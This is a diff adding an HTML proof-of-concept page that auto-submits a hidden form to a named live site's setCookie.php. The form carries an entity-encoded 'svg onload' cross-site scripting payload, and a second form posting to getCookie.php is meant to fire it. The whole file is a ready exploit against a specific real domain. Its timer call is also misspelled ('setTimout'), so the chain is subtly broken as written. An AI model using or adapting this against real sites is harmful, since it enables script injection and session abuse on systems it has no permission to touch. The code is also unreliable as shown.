@@ -1,0 +1,20 @@
+<iframe id=test1></iframe>
+<html>
+  <body>
+    <form target=test1 action="https://hecate.napoleongames.be/php/setCookie.php" method="POST">
+      <input type="hidden" name="param" value="country" />
+      <input type="hidden" name="value" value="&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;x" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <form action="https://hecate.napoleongames.be/php/getCookie.php" method="POST">
+      <input type="hidden" name="param" value="country" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+      setTimout(function(){
+        document.forms[1].submit();
+      },3000);
+    </script>
+  </body>
+</html>
